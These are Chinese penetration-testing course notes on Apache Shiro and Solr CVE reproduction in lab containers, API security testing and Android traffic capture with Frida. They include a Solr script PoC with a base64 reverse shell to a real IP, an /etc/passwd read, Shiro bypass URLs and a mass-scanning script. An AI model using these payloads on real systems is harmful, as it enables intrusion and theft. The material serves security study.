<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Shiro是一个强大且易用的Java安全框架，用于身份验证、授权、密码和会话管理</span><br><span class="line">判断：大多会发生在登录处，返回包里包含remeberMe=deleteMe字段，主要用到java中</span><br><span class="line">搜索：header=&quot;remeberMe=deleteMe&quot;</span><br><span class="line">在cookie中带有：Set-Cookie: remeberMe=deleteMe; Path=/; Max-Age=0; Expires=Tue, 26-Apr-2022 22:23:24 GMT</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">漏洞：https://avd.aliyun.com/search?q=shiro</span><br><span class="line">Apache Shiro &lt;= 1.2.4 默认密钥致命令执行漏洞【CVE-2016-4483】</span><br><span class="line">Apache Shiro &lt; 1.3.2 验证绕过漏洞【CVE-2016-2807】</span><br><span class="line">Apache Shiro &lt; 1.4.2 cookie oracle padding漏洞 【CVE-2019-12442】</span><br><span class="line">Apache Shiro &lt; 1.5.2 验证绕过漏洞 【CVE-2020-1957】</span><br><span class="line">Apache Shiro &lt; 1.5.3 验证绕过漏洞 【CVE-2020-11989】</span><br><span class="line">Apahce Shiro &lt; 1.6.0 验证绕过漏洞 【CVE-2020-13933】</span><br><span class="line">Apahce Shiro &lt; 1.7.1 权限绕过漏洞 【CVE-2020-17523】</span><br><span class="line">1、CVE_2016_4437 Shiro-550+Shiro-721</span><br><span class="line">环境：https://vulfocus.cn/#/dashboard?image_id=df02a278-761c-483b-913f-9f8142b9a19f</span><br><span class="line"> </span><br><span class="line">在GUI_Tools中也有他检测的漏洞利用。先点击检测当前秘钥，然后爆破秘钥，在接着爆破利用链及回显。回显结果： 发现构造链:CommonsCollections2  回显方式: TomcatEcho然后在选择相对应的。可以执行命令。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、CVE-2020-11989</span><br><span class="line">漏洞下载地址：https://github.com/jweny/shiro-cve-2020-17523</span><br><span class="line">影响范围：Apache Shiro &lt; 1.7.1</span><br><span class="line"> </span><br><span class="line">下载源码，用idea打开，直接启动，默认开放9090端口，访问：http://127.0.0.1:9090/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">默认加载的地方：org.test.springbootshiro.SpringbootShiroApplication</span><br><span class="line">点击springbookshiroapplication 然后edit</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在\src\main\java\org\test\springbootshiro目录下，有LoginController.java，SpringbootShiroApplication.java两个文件</span><br><span class="line"> </span><br><span class="line">在LoginController.java中，访问/doLogin，尝试输入账号密码，成功提示success，失败提示failed</span><br><span class="line">账号密码配置文件是在MyRealm.java文件中配置：java 123</span><br><span class="line"> </span><br><span class="line">当直接访问http://127.0.0.1:9090/admin/xxx的时候，地址就自动换成http://127.0.0.1:9090/login，显示内容为please login!，就是要登录的意思。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这个漏洞是直接访问：http://127.0.0.1:9090/admin/%20</span><br><span class="line">这样就可以直接登录到后台。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果在白盒的角度分析的话，这个漏洞是怎么产生的。在LoginController.java这个文件中，这个文件引用了一个包：import org.apache.shiro.SecurityUtils;</span><br><span class="line">在pom.xml配置文件中：</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;shiro-web&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.7.0&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"> </span><br><span class="line">引用了这个框架org.apache.shiro，版本是1.7.0符合漏洞版本。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3、CVE-2020-1957</span><br><span class="line">影响范围：Apache Shiro &lt; 1.5.3</span><br><span class="line"> </span><br><span class="line">启动环境：</span><br><span class="line">cd /vulhub-master/shiro$ cd CVE-2020-1957</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"> </span><br><span class="line">访问：http://192.168.233.128:8080/，点击login跳转：http://192.168.233.128:8080/login.html</span><br><span class="line">如果直接访问：http://192.168.233.128:8080/xxx/..;/admin/就相当于直接进入了后台目录</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">也可以在网上写python代码来进行测试：</span><br><span class="line">语法：app=&quot;APACHE-Shiro&quot;</span><br><span class="line"> </span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">for url in open(&#x27;ips.txt&#x27;):</span><br><span class="line">	url=url.strip()</span><br><span class="line">	url=&#x27;http://&#x27;+url+&#x27;/;/login&#x27;</span><br><span class="line">	try:</span><br><span class="line">		code=requests.get(url).status_code</span><br><span class="line">		print(code)</span><br><span class="line">		if code==200:</span><br><span class="line">			print(url+&#x27;|ok&#x27;)</span><br><span class="line">	except Exception as e:</span><br><span class="line">		pass</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">附加：shiro是很有名的漏洞点，特别是在面试中，基本上都会问到这个知识点。</span><br></pre></td></tr></table></figure>

<ul>
<li><h4 id="ApacheSolr-组件框架安全"><a href="#ApacheSolr-组件框架安全" class="headerlink" title="ApacheSolr-组件框架安全"></a>ApacheSolr-组件框架安全</h4></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Solr是一个开源的搜索服务，使用Java语言开发，主要基于HTTP和Apache Lucene实现的。Solr是一个高性能，采用Java5开发，基于Lucene的全文搜索服务器。</span><br><span class="line"> </span><br><span class="line">漏洞：https://avd.aliyun.com/search?q=solr</span><br><span class="line">远程命令执行RCE（CVE-2017-12629）</span><br><span class="line">远程命令执行XXE（CVE-2017-12629）</span><br><span class="line">任意文件读取AND命令执行（CVE-2019-17558）</span><br><span class="line">远程命令执行漏洞(CVE-2019-0192)</span><br><span class="line">远程命令执行漏洞(CVE-2019-0193)</span><br><span class="line">未授权上传漏洞(CVE-2020-13957)</span><br><span class="line">Apache Solr SSRF (CVE-2021-27905)</span><br><span class="line">1、远程命令执行RCE（CVE-2017-12629）</span><br><span class="line">影响版本：Apache solr&lt;7.1.0版本</span><br><span class="line">语法：app=&quot;APACHE-Solr&quot; &amp;&amp; title==&quot;Solr Admin&quot;</span><br><span class="line"> </span><br><span class="line">启动环境：</span><br><span class="line">cd /vulhub-master/solr/CVE-2017-12629-RCE</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"> </span><br><span class="line">参考：https://vulhub.org/#/environments/solr/CVE-2017-12629-RCE/</span><br><span class="line"> </span><br><span class="line">访问：http://192.168.233.128:8983/solr/#/</span><br><span class="line">访问特定地址进行抓包：</span><br><span class="line">http://192.168.233.128:8983/solr/demo/config</span><br><span class="line">POST提交：&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/success&quot;]&#125;&#125;</span><br><span class="line">执行的命令是：touch /tmp/success</span><br><span class="line">数据包：</span><br><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.233.128:8983</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 158</span><br><span class="line"> </span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/success&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">但是失败了，然后按照官方的原封不动的发：</span><br><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.233.128:8983</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 158</span><br><span class="line"> </span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/success&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入docker环境查看是否成功：</span><br><span class="line">进入：sudo docker-compose exec solr bash</span><br><span class="line">查看：ls /tmp</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、任意文件读取AND命令执行（CVE-2019-17558）</span><br><span class="line">影响版本：Apache Solr 5.0.0版本至8.3.1</span><br><span class="line"> </span><br><span class="line">环境：https://vulfocus.cn/#/dashboard?image_id=0c32e104-8afe-433d-8b10-904d18704bef</span><br><span class="line"> </span><br><span class="line">利用脚本：https://github.com/jas502n/solr_rce</span><br><span class="line"> </span><br><span class="line">这个脚本采用了python2开发，用到虚拟机的python2环境。</span><br><span class="line">执行命令：</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">也可以进行批量测试，修改solr_rce.py文件</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3、远程命令执行漏洞(CVE-2019-0193)</span><br><span class="line">影响版本：Apache Solr &lt; 8.2.0版本</span><br><span class="line">需要登录才能利用。</span><br><span class="line"> </span><br><span class="line">启动环境：</span><br><span class="line">cd /vulhub-master/solr/CVE-2019-0193</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">参考：https://vulhub.org/#/environments/solr/CVE-2019-0193/</span><br><span class="line"> </span><br><span class="line">访问：http://192.168.233.128:8983/solr/#/</span><br><span class="line">默认是没有test的，在执行：sudo docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">把poc进行复制：</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type=&quot;URLDataSource&quot;/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name=&quot;stackoverflow&quot;</span><br><span class="line">            url=&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span><br><span class="line">            processor=&quot;XPathEntityProcessor&quot;</span><br><span class="line">            forEach=&quot;/feed&quot;</span><br><span class="line">            transformer=&quot;script:poc&quot; /&gt;</span><br><span class="line">  &lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br><span class="line"> </span><br><span class="line">其中YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==是反弹命令base64编码。</span><br><span class="line">反弹命令：bash -i &gt;&amp; /dev/tcp/175.178.151.29/5566 0&gt;&amp;1</span><br><span class="line">base64：YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=</span><br><span class="line"> </span><br><span class="line">然后在点击execute with this configuration</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4、Apache Solr 文件读取&amp;SSRF (CVE-2021-27905)</span><br><span class="line"> </span><br><span class="line">启动环境：</span><br><span class="line">cd /vulhub-master/solr/Remote-Streaming-Fileread</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"> </span><br><span class="line">访问：http://192.168.233.128:8983/solr/#!/</span><br><span class="line">1、获取数据库名</span><br><span class="line">http://192.168.233.128:8983/solr/admin/cores?indexInfo=false&amp;wt=json</span><br><span class="line">数据库名：demo</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、访问触发</span><br><span class="line">curl -i -s -k -X $&#x27;POST&#x27; \</span><br><span class="line">    -H $&#x27;Content-Type: application/json&#x27; --data-binary $&#x27;&#123;\&quot;set-property\&quot;:&#123;\&quot;requestDispatcher.requestParsers.enableRemoteStreaming\&quot;:true&#125;&#125;&#x27; \</span><br><span class="line">    $&#x27;http://192.168.233.128:8983/solr/demo/config&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3、任意文件读取</span><br><span class="line">curl -i -s -k &#x27;http://192.168.233.128:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">为什么说也是ssrf漏洞，是因为用到了file协议去读取，这样也可以进行内网探针，比如把file协议进行修改为http协议。看支不支持http协议可以用dnslog来进行判断。</span><br><span class="line">curl -i -s -k &#x27;http://192.168.233.128:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=http://2e8m2t.dnslog.cn&#x27;</span><br><span class="line"> </span><br><span class="line">执行能接受到反弹，所以支持http协议。</span><br></pre></td></tr></table></figure>

<h1 id="第65天-API安全-接口安全-WebPack-REST-SOAP-WSDL-WebService"><a href="#第65天-API安全-接口安全-WebPack-REST-SOAP-WSDL-WebService" class="headerlink" title="第65天 API安全-接口安全&amp;WebPack&amp;REST&amp;SOAP&amp;WSDL&amp;WebService"></a>第65天 API安全-接口安全&amp;WebPack&amp;REST&amp;SOAP&amp;WSDL&amp;WebService</h1><h3 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h3><p>1.HTTP类接口-测评<br>2.RPC类接口-测评<br>3.Web Service类-测评<br>参考链接：<a href="https://www.jianshu.com/p/e48db27d7c70">https://www.jianshu.com/p/e48db27d7c70</a></p>
<h4 id="内容点：-1"><a href="#内容点：-1" class="headerlink" title="内容点："></a>内容点：</h4><p>SOAP(Simple Object Access Protocol)简单对象访问协议是交换数据的一种协议规范，<br>是一种轻量的、简单的、基于XML（标准通用标记语言下的一个子集）的协议，它被设计<br>成在WEB上交换结构化的和固化的信息，SOAP不是Web Servicet的专有协议，<br>SOAP使用HTTP来发送XML格式的数据，可以简单理解为：SOAP&#x3D;HTTP+XML</p>
<p>REST(Representational State Transfer)即表述性状态传递，在三种主流的Web服务实<br>现方案中，因为REST模式的Wb服务与复杂的SOAP和XML-RPC对比来讲明显的更加简<br>洁，越来越多的Web服务开始采用REST风格设计和实现。例如，Amazon.com提供接近<br>REST风格的Web服务进行图书查找；雅虎提供的Web服务也是REST风格的。</p>
<p>WSDL(Web Services Description Language)即网络服务描述语言，用于描述Web服务<br>的公共接口。这是一个基于XML的关于如何与Wb服务通讯和使用的服务描述；也就是描<br>述与目录中列出的Wb服务进行交互时需要绑定的协议和信息格式。通常采用抽象语言描<br>述该服务支持的操作和信息，使用的时候再将实际的网络协议和信息格式绑定给该服务。</p>
<h4 id="接口数据包："><a href="#接口数据包：" class="headerlink" title="接口数据包："></a>接口数据包：</h4><p>Method:请求方法<br>攻击方式：OPTIONS,PUT,MOVE,DELETE<br>效果：上传恶意文件，修改页面等<br>URL:唯一资源定位符<br>攻击方式：猜测，遍历，跳转<br>效果：未授权访问等<br>Params:请求参数<br>攻击方式：构造参数，修改参数，遍历，重发<br>效果：爆破，越权，未授权访问，突破业务逻辑等<br>Authorization:认证方式<br>攻击方式：身份伪造，身份篡改<br>效果：越权，未授权访问等<br>Headers:清求消息头<br>攻击方式：拦截数据包，改Hosts,<br>改Referer,改Content-Type等<br>效果：绕过身份认证，绕过Referer验证，绕过类型验证，DDOS等<br>Body:消息体<br>攻击方式：SQL注入，XML注入，反序列化等<br>效果：提权，突破业务逻辑，未授权访问等</p>
<p>安全问题：<br>XSS跨站，信息泄露，暴力破解，文件上传，未授权访问，JWT授权认证，接口滥用等</p>
<p>演示案例：<br>WebService:类-Wsdl&amp;ReadyAP-SQL注入<br>SOAP类-Swagger&amp;SoapUla&amp;EXP-信息泄露<br>HTTP类-WebPack&amp;PackerFuzzer-信息泄露</p>
<p>WebService-Wsdl&amp;SoapUl<br>探针：?wsdl<br>利用：SoapUla&amp;ReadyAPI<br>思路：使用googlehack语法查找可能含有漏洞的资产 edu.cn inurl:asmx?wsdl<br>使用工具readyAPI进行扫描—扫描出存在sql注入–sqlmap一把梭</p>
<p>SOAP-Swagger&amp;SoapUl&amp;EXP<br>探针：目录&amp;S资源<br>利用：SoapUla&amp;EXP<br><a href="https://github.com/lijiejie/swagger-exp">https://github.com/lijiejie/swagger-exp</a><br><a href="https://github.com/jayus0821/swagger-hack">https://github.com/jayus0821/swagger-hack</a><br>目录:<br>&#x2F;swagger<br>&#x2F;api&#x2F;swagger<br>&#x2F;swagger&#x2F;ui<br>&#x2F;api&#x2F;swagger&#x2F;ui<br>&#x2F;swagger-ui.html<br>&#x2F;api&#x2F;swagger-ui.html<br>&#x2F;user&#x2F;swagger-ui.html<br>&#x2F;libs&#x2F;swaggerui<br>&#x2F;api&#x2F;swaggerui<br>&#x2F;swagger-resources&#x2F;configuration&#x2F;ui<br>&#x2F;swagger-resources&#x2F;configuration&#x2F;security<br>思路同上 使用swagger-hack.py脚本</p>
<p>#HTTP-Webpack&amp;PackerFuzzer<br>探针：插件&amp;JS资源<br>利用：PackerFuzzer<br><a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p>
<h1 id="第66天-API安全-接口安全-阿里云KEY-postman-DVWS-XEE-鉴权-泄露"><a href="#第66天-API安全-接口安全-阿里云KEY-postman-DVWS-XEE-鉴权-泄露" class="headerlink" title="第66天 API安全-接口安全&amp;阿里云KEY%postman&amp;DVWS&amp;XEE&amp;鉴权&amp;泄露"></a>第66天 API安全-接口安全&amp;阿里云KEY%postman&amp;DVWS&amp;XEE&amp;鉴权&amp;泄露</h1><p>知识点<br>1.HTTP类接口-测评<br>2.RPC类接口-测评<br>3.Web Service类-测评<br>参考链接：<a href="https://www.jianshu.com/p/e48db27d7c70">https://www.jianshu.com/p/e48db27d7c70</a></p>
<p>内容点：<br>SOAP(Simple Object Access Protocol)简单对象访问协议是交换数据的一种协议规范，<br>是一种轻量的、简单的、基于XML（标准通用标记语言下的一个子集）的协议，它被设计<br>成在WEB上交换结构化的和固化的信息，SOAP不是Web Servicet的专有协议，<br>SOAP使用HTTP来发送XML格式的数据，可以简单理解为：SOAP&#x3D;HTTP+XML</p>
<p>REST(Representational State Transfer)即表述性状态传递，在三种主流的Web服务实<br>现方案中，因为REST模式的Wb服务与复杂的SOAP和XML-RPC对比来讲明显的更加简<br>洁，越来越多的Web服务开始采用REST风格设计和实现。例如，Amazon.com提供接近<br>REST风格的Web服务进行图书查找；雅虎提供的Web服务也是REST风格的。</p>
<p>WSDL(Web Services Description Language)即网络服务描述语言，用于描述Web服务<br>的公共接口。这是一个基于XML的关于如何与Wb服务通讯和使用的服务描述；也就是描<br>述与目录中列出的Wb服务进行交互时需要绑定的协议和信息格式。通常采用抽象语言描<br>述该服务支持的操作和信息，使用的时候再将实际的网络协议和信息格式绑定给该服务。</p>
<p>接口数据包：<br>Method:请求方法<br>攻击方式：OPTIONS,PUT,MOVE,DELETE<br>效果：上传恶意文件，修改页面等<br>URL:唯一资源定位符<br>攻击方式：猜测，遍历，跳转<br>效果：未授权访问等<br>Params:请求参数<br>攻击方式：构造参数，修改参数，遍历，重发<br>效果：爆破，越权，未授权访问，突破业务逻辑等<br>Authorization:认证方式<br>攻击方式：身份伪造，身份篡改<br>效果：越权，未授权访问等<br>Headers:清求消息头<br>攻击方式：拦截数据包，改Hosts,<br>改Referer,改Content-Type等<br>效果：绕过身份认证，绕过Referer验证，绕过类型验证，DDOS等<br>Body:消息体<br>攻击方式：SQL注入，XML注入，反序列化等<br>效果：提权，突破业务逻辑，未授权访问等</p>
<p>安全问题：<br>XSS跨站，信息泄露，暴力破解，文件上传，未授权访问，JWT授权认证，接口滥用等</p>
<p>演示案例：<br>工具使用-Postman自动化汉测试<br>安全问题-Dvws泄世漏&amp;鉴权&amp;XE<br>安全问题-阿里KEY信息泄漏利用<br>应用方向-违法APP打包接口分析</p>
<p>工具使用-Postman自动化测试<br><a href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a></p>
<h4 id="安全问题-Dvws世是-鉴权-OXE"><a href="#安全问题-Dvws世是-鉴权-OXE" class="headerlink" title="安全问题-Dvws世是&amp;鉴权&amp;OXE"></a>安全问题-Dvws世是&amp;鉴权&amp;OXE</h4><p><a href="https://github.com/snoopysecurity/dvws-node">https://github.com/snoopysecurity/dvws-node</a><br>1、注册时抓包可尝试修改admin为ture，看看能否绕过jwt验证<br>登录返回的数据包为admin，false</p>
<p>修改登录数据包为admin&#x3D;true</p>
<p>2、通过数据包中body的格式判断提交请求的格式为xml格式，尝试是否存在XXE漏洞，利用XXE可以实现读取文件、若误回显可以尝试外部实体注入或者使用dnslog检测漏洞存在<br>复现：在用户数据搜索出抓包，看到格式为xml格式，尝试使用xxe漏洞读取到文件</p>
<p>安全问题-阿里云KEY信息池漏利用<br><a href="https://yun.cloudbility.com/">https://yun.cloudbility.com/</a><br><a href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a><br>接口配置文件泄漏导致云资源生机受控<br>目前为止，云服务器已经占据了服务器的大部分市场，由于云服务器易管理，操作性强，安全程度高。很多大型厂商都选择将资产部署在云服务上，但安全的同时由于运维人员的疏忽也会导致一些非预期的突破口。当云产品Accesskey在调用过程中，出现泄漏会导致对象控制资源全部被控，影响严重！<br>1、常规获取Accesskey方式<br>-通过源码泄漏配置文件<br>-通过应用程序报错读取<br>-通过JS文件引用中获取<br>如图：页面报错</p>
<h5 id="应用方向违法APP打包接口分析"><a href="#应用方向违法APP打包接口分析" class="headerlink" title="应用方向违法APP打包接口分析"></a>应用方向违法APP打包接口分析</h5><p>完整的分析流程：burp抓包找到真实访问的域名地址—通过信息收集到含有使用webpack组件的网站<br>–使用&#x2F;Packer-Fuzzer工具扫描</p>
<h1 id="第67天-APP攻防-Frida反证书抓包-移动安全系统-资产提取-评估扫描"><a href="#第67天-APP攻防-Frida反证书抓包-移动安全系统-资产提取-评估扫描" class="headerlink" title="第67天 APP攻防-Frida反证书抓包&amp;移动安全系统&amp;资产提取&amp;评估扫描"></a>第67天 APP攻防-Frida反证书抓包&amp;移动安全系统&amp;资产提取&amp;评估扫描</h1><h4 id="知识点：-44"><a href="#知识点：-44" class="headerlink" title="知识点："></a>知识点：</h4><p>1、资产提权-AppinfoScanner<br>2、评估框架-MobSF&amp;mobexler<br>3、抓包利器-Frida&amp;rOcapture</p>
<h4 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h4><p>1、信息收集-应用&amp;资产提取&amp;权限等<br>2、漏洞发现反编译&amp;脱壳&amp;代码审计<br>3、安全评估-组件&amp;敏感密匙&amp;恶意分析</p>
<h4 id="核心点："><a href="#核心点：" class="headerlink" title="核心点："></a>核心点：</h4><p>0、内在点资产提取&amp;版本&amp;信息等<br>1、抓包点-反代理&amp;反证书&amp;协议等<br>2、逆向点-反编译&amp;脱壳&amp;重打包等<br>3、安全点资产&amp;接口8漏洞&amp;亩计等</p>
<h4 id="演示案例：-38"><a href="#演示案例：-38" class="headerlink" title="演示案例："></a>演示案例：</h4><p>内在-资产提取-AppinfoScanner<br>内在-安全评估-MobSF&amp;mobexler<br>外在-证书抓包-Frida-server&amp;rOcapture</p>
<h4 id="内在-资产提取-Appinfoscanner"><a href="#内在-资产提取-Appinfoscanner" class="headerlink" title="内在-资产提取-Appinfoscanner"></a>内在-资产提取-Appinfoscanner</h4><p>Appinfoscanner一款适用于以HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、<br>iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、<br>红队成员快速收集到移动端或奢静态WEB站点中关键的资产信惠并提供基本的信息输出，<br>如：Title、Domain、CDN、撞纹信息、状态信息等.<br>httpslgithub.com&#x2F;kelvinBen&#x2F;AppinfoScanner</p>
<h4 id="内在-安全评估-MobsF-mobexler"><a href="#内在-安全评估-MobsF-mobexler" class="headerlink" title="内在-安全评估-MobsF&amp;mobexler"></a>内在-安全评估-MobsF&amp;mobexler</h4><p>移动安全框爆（MobsF）是一种自动化的一体化移动应用程序（AndroidiosWindows）渗<br>透测试、恶意软件分析和安全评估框案，能够执行静态和动态分析，MobSF支持移动应用<br>程序二进制文件（APK、XAPK、IPA和APPX）以及压缩源代码，并视供RESTAPI以与<br>您的CI&#x2F;CD或DevSecOps管道无缝集成。动态分析器可帮助您执行运行时安全评估和交<br>互式仪器浏试。<br>-Mobexler是基于ElementaryOs的定制虚拟机，盲在带助进行Android和iOs应用程序的渗<br>透测试。Mobexler预装了各种开源工具，脚本，黑密必备件等，这些部是安全测试<br>Androld和ios应用程序所必需的.<br>https:l&#x2F;mobexler.com&#x2F;<br>https:&#x2F;lgithub.com&#x2F;MobsF&#x2F;Mobile-Security-Framework-MobsF<br>dockerpullopensecurity&#x2F;mobile-secunity-framework-mobst<br>docker run -it -p 8008:8000 opensecurity&#x2F;mobile-security-framework-mobsf:latest</p>
<h4 id="外在-证书抓包-frida-server-rocapture"><a href="#外在-证书抓包-frida-server-rocapture" class="headerlink" title="外在-证书抓包-frida-server&amp;rocapture"></a>外在-证书抓包-frida-server&amp;rocapture</h4><p>-r0capture仅限安卓平台，测试安卓7、8、9、10、11 可用 ;<br>无视所有证书校验或绑定，不用考虑任何证书的事情；<br>通杀TCP&#x2F;P四层模型中的应用层中的全部协议；<br>通杀协议包括：Http,Websocket,Ftp,Xmpp,Imap,Smtp,Protobu等、及它们的ssL版本;<br>通杀所有应用层框架，包括HttpUrlConnection、Okhttp1&#x2F;3&#x2F;4、Retrofit&#x2F;Volley等等;<br>无视加固，不管是整体壳还是二代壳或VMP，不用考虑加固的事情;<br>-Firda 是一款易用的跨平 Hook 工具，Java 层到 Native 层的 Hook 无所不能，是一种 动<br>态的插桩工具，可以插入代码到原生App的内存空间中，动态的去监视和修改行为，原生<br>平台包括Win、Mac、Linux、Android、ios全平台。</p>
<p>测试环境：<br>Windows10Python3.7夜神模拟器rocapturefrida-serverwireshark<br><a href="https://lgithub.com/roysue/rocapture">https://lgithub.com/roysue/rocapture</a><br><a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a></p>
<p>3、转发并启动Frida<br>adbforwardtcp:27042tcp:27042<br>连接判断: frida-ps-U frida-ps-R<br>4、获取包名并运行抓包<br>获取包名：Is&#x2F;data&#x2F;data或ApkMessenger<br>python rocapture.py-U -f包名-p xxxx.pcap</p>
<h1 id="第68天-APP攻防-Xposed-Frida-Hook-证书校验-反代理-代理转发"><a href="#第68天-APP攻防-Xposed-Frida-Hook-证书校验-反代理-代理转发" class="headerlink" title="第68天 APP攻防-Xposed&amp;Frida&amp;Hook&amp;证书校验&amp;反代理&amp;代理转发"></a>第68天 APP攻防-Xposed&amp;Frida&amp;Hook&amp;证书校验&amp;反代理&amp;代理转发</h1><h4 id="知识点：-45"><a href="#知识点：-45" class="headerlink" title="知识点："></a>知识点：</h4><p>1、APP防代理绕过-应用&amp;转发<br>2、APP证书校验类型-单向&amp;双向<br>3、APP证书校验绕过-Frida&amp;XP框架等</p>
<h4 id="章节点：-1"><a href="#章节点：-1" class="headerlink" title="章节点："></a>章节点：</h4><p>1、信息收集-应用&amp;资产提取&amp;权限等<br>2、漏洞发现-反编译&amp;脱壳&amp;代码审计<br>3、安全评估-组件&amp;敏感密匙&amp;恶意分析</p>
<h4 id="核心点：-1"><a href="#核心点：-1" class="headerlink" title="核心点："></a>核心点：</h4><p>0、内在点-资产提取&amp;版本&amp;信息等<br>1、抓包点-反代理&amp;反证书&amp;协议等<br>2、逆向点-反编译&amp;脱壳&amp;重打包等<br>3、安全点-资产&amp;接口&amp;漏洞&amp;审计等</p>
